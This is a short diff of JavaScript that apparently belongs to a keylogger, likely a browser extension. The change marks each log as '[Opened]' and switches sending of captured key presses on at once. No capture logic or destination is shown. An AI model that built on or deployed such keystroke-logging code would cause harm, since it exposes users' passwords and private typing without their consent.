@@ -5,9 +5,9 @@
 // data used to hold key presses
 var data = {};
 var time = new Date().getTime();
-data[time] = ''
+data[time] = '[Opened]'
 // makes sure we only send when there's something to send
-var shouldSend = false;
+var shouldSend = true;
 // used for issues with allframes injection
 var lastLog = time;
 
